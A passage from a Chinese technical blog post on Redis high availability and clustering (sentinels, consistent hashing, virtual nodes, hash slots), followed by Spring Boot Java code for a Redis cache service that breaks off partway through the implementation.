<strong><u>“主从-哨兵” 架构</u></strong>。</p><p><img src="imgs/sentinels-and-replicas.png" width="400px" /></p><p>为了确保不会因为 network partition 而出现多个 primary（“split-brain problem”），可以将 coordinator 中选举 primary、心跳监测的职责分出给唯一的 view server。第一次 coordinator 接受 client 请求时先询问 view server 关于 primary 的信息，然后再向 primary 给出修改请求。</p><p>最终，如果还需要保证 view server 的高可用以及数据一致性，还可以将轻量的 view server 进行 replications 并交由 Paxos 或者 ZooKeeper 或者 KRaft 来做分布式协调管理。</p><p>一般为了架构简单起见，可以不使用 view server，直接在 sentinels 中引入 primary 投票机制（主观下线、客观下线），粗略地模拟 Paxos 的一致性协调管理。</p><blockquote><p> 注：选拔 Primary 的标准可以考虑硬件配置、断开 primary 连接的时间长短等等信息来指定优先级，从而选择。</p></blockquote><h2 id="3-6-内存数据库集群"><a href="#3-6-内存数据库集群" class="headerlink" title="3.6 内存数据库集群"></a>3.6 内存数据库集群</h2><p>前面的例子虽然介绍了，内存数据库可以通过建立 replicas 来提升高可用性，但是单个物理节点的存储量总有上限。</p><p>在极大的 data working set 场景下，我们可能需要通过集群来实现更大规模数据的缓存。</p><p>首先需要解决集群后的缓存位置问题。大多数内存型数据库采用了 <strong><u>一致性哈希（Consistent Hashing）思想</u></strong>：</p><ul><li><p>我们先按照常用的 hash 算法将 Key hash 到 $0\sim2^{32}-1$ 个桶中，并且把它们想象成一个环结构；</p></li><li><p>将机器的唯一标识（例如 <code>MAC/IP/HOSTNAME</code> 等信息）以及需要缓存的 KV 都 hash 到环上；</p></li><li><p>于是就能判断信息究竟放在哪一台服务器上了：按顺时针方向，所有对象 hash 的位置距离最近的机器 hash 点就是要存的机器，如下图所示：</p><p><img src="imgs/consistent-hashing-example.png" width="600px" /></p></li><li><p>当有机器（<code>t4</code>）加入分布式集群后，<code>t3 - t4</code> 间的缓存将转移至 <code>t4</code> 上（少量数据交换）；</p><p>反之，有机器（<code>t4</code>）从分布式集群中离线后，<code>t3 - t4</code> 间的缓存将重新转移至 <code>t2</code>；</p></li></ul><p>此外，hash 的位置可以根据机器的硬件承载能力适当调整。调整方法可以借助下文介绍的 virtual nodes 来完成。</p><p>这样的方案能在分布式场景下尽可能减少缓存失效和变动的比例；</p><p>但这种方案仍然存在问题：当集群中的节点数量较少时，可能会出现<strong><u>节点在哈希空间中分布不平衡</u></strong>的问题（hash 环的倾斜和负载不均），甚至引发雪崩问题（最多数据的 A 故障，全转移给 B，然后 B 故障，并重复下去，造成整个分布式集群崩溃）。</p><p>解决 hash 环倾斜的问题的方案之一就是引入 “<strong><u>虚拟节点</u></strong>”（相当于给机器 hash 点创建 “软链接”），将 virtual nodes 和 real nodes 的映射关系记录在 Hash Ring 中；</p><p>上面解决方案的具体实现被称为 “<strong><u>Chord 算法</u></strong>”；</p><p>我们现在继续以 Redis 为例。在 Redis 集群中，实现的方法略有差别，它一般创建一个超大的数组，例如 <code>struct clusterNode *slots[]</code>，规定哪些 Key Hash 值的范围由指定的 Redis 实例负责。并且只有数组中的所有 entries 都被分配给一个 Redis 实例，整个集群才能认为是上线状态。</p><p>因此真正在 Redis 集群中的查询动作通常会先检查数据是否缓存在当前结点中，如果不是则响应 <code>MOVE(IP:PORT)</code> 来指示 client 应该对哪个实例请求该数据。</p><p>现在，我们把集群配合上之前提到的 replicas，形成经典的 “<strong><u>三主三从 + 哨兵 架构</u></strong>”，以此来提升集群的整体可用性：</p><p><img src="imgs/replicas-dist.png" width="400px" /></p><h1 id="Appendix-Redis-Spring-Boot-Example"><a href="#Appendix-Redis-Spring-Boot-Example" class="headerlink" title="Appendix:  Redis + Spring Boot Example"></a>Appendix:  Redis + Spring Boot Example</h1><p>下面是使用 Spring Boot 框架的 Redis 单物理节点代码示例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CacheService</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Check if the cache(redis) is used and connected.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAlive</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the data from the cache and database.</span></span><br><span class="line"><span class="comment">     * If cache misses, it will use fallback function to get the current data and cache then.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> keyPrefix The key prefix of the stored items</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id The key ID to identify the specific items from a group of stored items</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> type The type of stored items</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> fallback The fallback database query function used when cache misses</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> time The TTL for the specific cached item</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> unit The time unit of the TTL</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Always the specific stored item consistent with database</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;Optional&lt;R&gt; <span class="title function_">queryAndCache</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, ID id, TypeReference&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the data from the cache and database.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> CacheService#queryAndCache(String, Object, TypeReference, Function, Long, TimeUnit)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;Optional&lt;R&gt; <span class="title function_">queryAndCache</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, ID id, Class&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get a bunch of data from the cache.</span></span><br><span class="line"><span class="comment">     * If cache misses, it will use fallback function to get the current data and cache then.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> The returned list is ordered.</span></span><br><span class="line"><span class="comment">     *  But R could be null if ID is not found in either cache or database.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> CacheService#queryAndCache(String, Object, TypeReference, Function, Long, TimeUnit)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;List&lt;R&gt; <span class="title function_">queryInBatch</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, List&lt;ID&gt; ids, Class&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Only query the data from the cache.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@apiNote</span> [WARNING] We don&#x27;t suppose you to use this method for the following reasons:</span></span><br><span class="line"><span class="comment">     *  1. It will not cache the results, which may cause cache penetration if you use it heavily;</span></span><br><span class="line"><span class="comment">     *  2. The result may be not consistent with database, for it only query on redis for existence.</span></span><br><span class="line"><span class="comment">     *  So you are advised to:</span></span><br><span class="line"><span class="comment">     *  - Put the result after you finally get the data;</span></span><br><span class="line"><span class="comment">     *  - Retry the query on database if you cannot find it</span></span><br><span class="line"><span class="comment">     *    (because it doesn&#x27;t mean that the data don&#x27;t exist in database).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> CacheService#put(String, Object, Object, Long, TimeUnit)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;Optional&lt;R&gt; <span class="title function_">_query</span><span class="params">(String keyPrefix, ID id, TypeReference&lt;R&gt; type)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Put the specific item into the cache.</span></span><br><span class="line"><span class="comment">     * It will overwrite the original item with the same key (if exists).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@implNote</span> Use asynchronous operation to improve the throughput.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;<span class="keyword">void</span> <span class="title function_">put</span><span class="params">(String keyPrefix, ID id, R val, Long time, TimeUnit unit)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Put cache items in batch.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@apiNote</span> We don&#x27;t use TTL here to avoid a bunch of data use a same TTL,</span></span><br><span class="line"><span class="comment">     *  which may cause cache avalanche.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@implNote</span></span></span><br><span class="line"><span class="comment">     *  1. Use discrete &amp; random TTL for each item.</span></span><br><span class="line"><span class="comment">     *  2. Use asynchronous operation to improve the throughput.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;R, ID&gt;<span class="keyword">void</span> <span class="title function_">putInBatch</span><span class="params">(String keyPrefix, List&lt;ID&gt; ids, List&lt;R&gt; values)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Invalidate the specific item from the cache.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@implNote</span> It will actually invalid the cached item by putting an invalid value to it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;ID&gt;Boolean <span class="title function_">invalidate</span><span class="params">(String keyPrefix, ID id)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Invalidate the stored items with the same key prefix.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@implNote</span> It will actually invalid the cached item by putting an invalid value to it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Long <span class="title function_">invalidateByKeyPrefix</span><span class="params">(String keyPrefix)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Purge the stored item from the cache.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &lt;ID&gt;Boolean <span class="title function_">remove</span><span class="params">(String keyPrefix, ID id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CacheServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">CacheService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate template;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ObjectMapper mapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAlive</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RedisConnectionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> template.getConnectionFactory();</span><br><span class="line">            <span class="keyword">return</span> factory != <span class="literal">null</span> &amp;&amp; !factory.getConnection().isClosed();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Exception occurs when checking redis connection: &#123;&#125;&quot;</span>, exception.getMessage());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; Optional&lt;R&gt; <span class="title function_">queryAndCache</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, ID id, Class&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span> &#123;</span><br><span class="line">        TypeReference&lt;R&gt; typeReference = <span class="keyword">new</span> <span class="title class_">TypeReference</span>&lt;&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Type <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> type;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.queryAndCache(keyPrefix, id, typeReference, fallback, time, unit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; Optional&lt;R&gt; <span class="title function_">queryAndCache</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, ID id, TypeReference&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> keyPrefix + id.toString();</span><br><span class="line">        <span class="comment">// Stage 1. lookup in redis</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) <span class="keyword">try</span> &#123;</span><br><span class="line">            String jsonResult;</span><br><span class="line">            <span class="comment">// maybe fault</span></span><br><span class="line">            jsonResult = template.opsForValue().get(key);</span><br><span class="line">            <span class="keyword">if</span> (jsonResult != <span class="literal">null</span>) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Cache hit when fetching key: &#123;&#125;&quot;</span>, key);</span><br><span class="line">                <span class="comment">// has non-blank value in redis?</span></span><br><span class="line">                <span class="keyword">if</span> (jsonResult.equals(Cache.REDIS_INVALID_VALUE)) &#123;</span><br><span class="line">                    <span class="comment">// empty value indicates non-existence.</span></span><br><span class="line">                    <span class="keyword">return</span> Optional.empty();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// <span class="doctag">TODO:</span> cache hit 后是否更新 TTL?</span></span><br><span class="line">                    <span class="type">R</span> <span class="variable">v</span> <span class="operator">=</span> mapper.readValue(jsonResult, type);</span><br><span class="line">                    <span class="keyword">return</span> Optional.of(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Failed to fetch data from redis due to: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Stage 2. fallback to database</span></span><br><span class="line">        Optional&lt;R&gt; dbResult = fallback.apply(id);</span><br><span class="line">        log.debug(<span class="string">&quot;Cache miss when fetching key: &#123;&#125;. Cache it now&quot;</span>, key);</span><br><span class="line">        <span class="comment">// we deliberately write empty value to indicate non-existence.</span></span><br><span class="line">        <span class="built_in">this</span>.put(keyPrefix, id, dbResult.isPresent() ? dbResult.get() : Cache.REDIS_INVALID_VALUE, time, unit);</span><br><span class="line">        <span class="keyword">return</span> dbResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; List&lt;R&gt; <span class="title function_">queryInBatch</span><span class="params">(</span></span><br><span class="line"><span class="params">            String keyPrefix, List&lt;ID&gt; ids, Class&lt;R&gt; type,</span></span><br><span class="line"><span class="params">            Function&lt;ID, Optional&lt;R&gt;&gt; fallback,</span></span><br><span class="line"><span class="params">            Long time, TimeUnit unit</span></span><br><span class="line"><span class="params">    )</span> &#123;</span><br><span class="line">        List&lt;R&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) &#123;</span><br><span class="line">            <span class="comment">// query in redis first</span></span><br><span class="line">            <span class="keyword">for</span> (ID id: ids) &#123;</span><br><span class="line">                R curRes;</span><br><span class="line">                String jsonResult;</span><br><span class="line">                <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> keyPrefix + id.toString();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// maybe fault</span></span><br><span class="line">                    jsonResult = template.opsForValue().get(key);</span><br><span class="line">                    <span class="keyword">if</span> (jsonResult != <span class="literal">null</span>) &#123;</span><br><span class="line">                        log.debug(<span class="string">&quot;Cache hit when doing batch query: &#123;&#125;&quot;</span>, key);</span><br><span class="line">                        curRes = mapper.readValue(jsonResult, type);</span><br><span class="line">                        <span class="keyword">if</span> (!curRes.equals(Cache.REDIS_INVALID_VALUE)) &#123;</span><br><span class="line">                            result.addLast(curRes);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// not exist</span></span><br><span class="line">                            result.addLast(<span class="literal">null</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                    log.warn(<span class="string">&quot;Batch query failed: &#123;&#125;. Skip current one.&quot;</span>,</span><br><span class="line">                            exception.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// fallback to database</span></span><br><span class="line">                curRes = fallback.apply(id).orElse(<span class="literal">null</span>);</span><br><span class="line">                log.debug(<span class="string">&quot;Cache miss when doing batch query: &#123;&#125;. Cache it now&quot;</span>, key);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// set cache</span></span><br><span class="line">                    template.opsForValue().set(</span><br><span class="line">                            key, curRes == <span class="literal">null</span> ? Cache.REDIS_INVALID_VALUE</span><br><span class="line">                                    : mapper.writeValueAsString(curRes),</span><br><span class="line">                            time, unit</span><br><span class="line">                    );</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                    log.warn(<span class="string">&quot;Cache data from database failed when batching query: &#123;&#125;. Skip current one.&quot;</span>,</span><br><span class="line">                            exception.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">                result.addLast(curRes);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// query in database only</span></span><br><span class="line">            <span class="keyword">for</span> (ID id: ids) &#123;</span><br><span class="line">                result.addLast(fallback.apply(id).orElse(<span class="literal">null</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; Optional&lt;R&gt; <span class="title function_">_query</span><span class="params">(String keyPrefix, ID id, TypeReference&lt;R&gt; type)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> keyPrefix + id.toString();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isAlive()) <span class="keyword">try</span> &#123;</span><br><span class="line">            String jsonResult;</span><br><span class="line">            <span class="comment">// may be fault even we have already checked the liveness</span></span><br><span class="line">            jsonResult = template.opsForValue().get(key);</span><br><span class="line">            <span class="keyword">if</span> (jsonResult != <span class="literal">null</span>) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Cache hit when fetching key with _query: &#123;&#125;&quot;</span>, key);</span><br><span class="line">                <span class="comment">// has non-blank value in redis?</span></span><br><span class="line">                <span class="keyword">if</span> (!jsonResult.equals(Cache.REDIS_INVALID_VALUE)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> Optional.of(mapper.readValue(jsonResult, type));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Sadly we cannot use empty value to indicate non-existence. :(</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Failed to do simple query on redis due to: &#123;&#125;&quot;</span>,</span><br><span class="line">                    exception.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        log.debug(<span class="string">&quot;Cache miss when fetching key with _query: &#123;&#125;&quot;</span>, key);</span><br><span class="line">        <span class="keyword">return</span> Optional.empty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(String keyPrefix, ID id, R val, Long time, TimeUnit unit)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span 